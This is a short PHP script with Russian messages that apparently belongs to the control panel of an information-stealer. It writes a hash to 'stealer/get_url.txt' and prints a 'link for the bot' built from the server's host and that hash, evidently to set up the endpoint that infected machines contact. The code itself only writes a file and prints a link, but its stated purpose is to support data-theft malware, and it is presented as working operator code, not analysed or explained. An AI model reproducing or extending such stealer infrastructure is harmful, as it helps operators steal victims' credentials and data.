<?php

$hash = "1cb7b78acb7b698de4346095739a2ecb";

$file = "stealer/get_url.txt";

$fd = fopen($file,"w");
if(!$fd) {
 exit("Не возможно открыть файл");
}
if(!flock($fd,LOCK_EX)) {
 exit("Блокировка файла не удалась");
}
fwrite($fd,$hash."\n");

if(!flock($fd,LOCK_UN)) {
 exit("Не возможно разблокировать файл");
}
fclose($fd);

$path = substr($_SERVER['PHP_SELF'],0,strrpos($_SERVER['PHP_SELF'],"/"));
echo "<br /><p>Ваша ссылка для бота</p><br />";
echo "<a href='http://".$_SERVER['HTTP_HOST'].$path."/bot=".$hash."'>http://".$_SERVER['HTTP_HOST']."/stealer"."=".$hash."</a>";
?>